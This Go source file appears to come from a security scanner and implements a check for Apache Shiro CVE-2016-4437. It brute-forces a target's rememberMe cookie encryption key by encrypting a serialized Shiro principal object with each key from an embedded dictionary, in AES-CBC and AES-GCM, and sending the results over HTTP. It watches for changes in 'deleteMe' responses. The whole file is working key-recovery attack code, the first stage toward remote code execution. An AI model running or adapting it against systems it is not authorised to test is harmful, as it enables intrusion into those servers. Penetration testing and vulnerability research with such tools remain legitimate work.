package shiro

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"fmt"
	"github.com/google/uuid"
	regexp "github.com/wasilibs/go-re2"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"io"
	"strings"
)

//go:embed dicts/keys.txt
var keys1 string

func init() {
	if "" != keys1 {
		keys1 = strings.TrimSpace(keys1)
		keys = strings.Split(keys1, "\n")
	} else {
		logging.Logger.Println("Warning, unable to load into dicts/keys.txt")
	}
}

var (
	keys          = []string{}
	checkContentx = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
)

func padding(plainText []byte, blockSize int) []byte {
	n := blockSize - len(plainText)%blockSize
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

func aES_CBC_Encrypt(key []byte, Content []byte) string {
	block, _ := aes.NewCipher(key)
	Content = padding(Content, block.BlockSize())
	iv, _ := uuid.New().MarshalBinary()
	blockMode := cipher.NewCBCEncrypter(block, iv)
	cipherText := make([]byte, len(Content))
	blockMode.CryptBlocks(cipherText, Content)
	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...))
}

func aES_GCM_Encrypt(key []byte, Content []byte) string {
	block, _ := aes.NewCipher(key)
	nonce := make([]byte, 16)
	io.ReadFull(rand.Reader, nonce)
	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...))
}

func getkeylen(u string, indexlen int, rememberMe string, cookie string, client *httpx.Client) (int, error) {
	var header = make(map[string]string, 1)
	if cookie == "" {
		cookie = "rememberMe"
	}
	header["Cookie"] = cookie + "=" + rememberMe
	if req, err := client.Request(u, "GET", "", header, "Poc Shiro"); err == nil {
		var SetCookieAll string
		for i := range req.RespHeader["Set-Cookie"] {
			SetCookieAll += req.RespHeader["Set-Cookie"][i]
		}
		if req.RespHeader != nil {
			counts := regexp.MustCompile(cookie+"=deleteMe").FindAllStringIndex(SetCookieAll, -1)
			return len(counts), nil
		}
	} else {
		return indexlen, err
	}
	return indexlen, nil
}
func CVE_2016_4437(u string, cookie string, client *httpx.Client) (key string, mode string) {
	if indexlen, err := getkeylen(u, 0, "1", cookie, client); err == nil {
		Content, _ := base64.StdEncoding.DecodeString(checkContentx)
		for _, key = range keys {
			logging.Logger.Debug("test key: ", key)
			decodekey, _ := base64.StdEncoding.DecodeString(key)
			RememberMe1 := aES_CBC_Encrypt(decodekey, Content) // AES CBC加密
			RememberMe2 := aES_GCM_Encrypt(decodekey, Content) // AES GCM加密
			if CBClen, err := getkeylen(u, indexlen, RememberMe1, cookie, client); err == nil {
				if CBClen != indexlen {
					logging.Logger.Infof(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s CBC-KEY: %s", u, key))
					return key, "CBC"
				}
			}
			if GCMlen, err := getkeylen(u, indexlen, RememberMe2, cookie, client); err == nil {
				if GCMlen != indexlen {
					logging.Logger.Infof(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s GCM-KEY: %s", u, key))
					return key, "GCM"
				}
			}
		}
	}
	return "", ""
}
